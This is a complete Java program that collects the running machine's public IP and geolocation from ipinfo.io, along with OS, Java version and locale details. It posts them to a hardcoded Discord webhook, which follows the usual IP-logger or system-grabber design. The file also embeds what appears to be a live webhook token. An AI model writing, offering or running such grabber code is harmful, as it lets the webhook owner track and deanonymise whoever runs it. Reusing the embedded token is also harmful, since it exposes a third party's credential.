import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SystemInfoToDiscord {

    private static final String DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1303797692471836752/UGvqu5pljOtWO-BwVn722myUjIKAs17lKGPDkPZlCOfuX0fWgqNFgB2zS_OrvnVLJT0T";
    private static final String IPINFO_API_URL = "https://ipinfo.io/json";

    public static void main(String[] args) {
        try {
            String ipData = fetchIpData();
            if (ipData == null) {
                System.out.println("Failed to retrieve IP data.");
                return;
            }

            String osName = System.getProperty("os.name");
            String osVersion = System.getProperty("os.version");
            String javaVersion = System.getProperty("java.version");
            String userCountry = System.getProperty("user.country");
            String userLanguage = System.getProperty("user.language");

            String jsonPayload = "{\n" +
                    "  \"content\": \"**System and IP Information**\",\n" +
                    "  \"embeds\": [\n" +
                    "    {\n" +
                    "      \"title\": \"System & Network Information\",\n" +
                    "      \"fields\": [\n" +
                    "        { \"name\": \"Operating System\", \"value\": \"" + osName + " " + osVersion + "\", \"inline\": true },\n" +
                    "        { \"name\": \"Java Version\", \"value\": \"" + javaVersion + "\", \"inline\": true },\n" +
                    "        { \"name\": \"Language\", \"value\": \"" + userLanguage + "-" + userCountry + "\", \"inline\": true },\n" +
                    "        { \"name\": \"IP Data\", \"value\": \"" + ipData.replace("\"", "") + "\", \"inline\": false }\n" +
                    "      ]\n" +
                    "    }\n" +
                    "  ]\n" +
                    "}";

            sendToDiscord(jsonPayload);
            System.out.println("Information sent to Discord.");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String fetchIpData() {
        try {
            URL url = new URL(IPINFO_API_URL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();

            return response.toString();
        } catch (Exception e) {
            System.out.println("Error fetching IP data: " + e.getMessage());
            return null;
        }
    }

    private static void sendToDiscord(String jsonPayload) throws Exception {
        URL url = new URL(DISCORD_WEBHOOK_URL);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setDoOutput(true);

        try (OutputStream os = connection.getOutputStream()) {
            os.write(jsonPayload.getBytes("UTF-8"));
        }

        int responseCode = connection.getResponseCode();
        if (responseCode == 204) {
            System.out.println("Data sent successfully to Discord!");
        } else {
            System.out.println("Failed to send data to Discord. Response Code: " + responseCode);
        }
    }
}
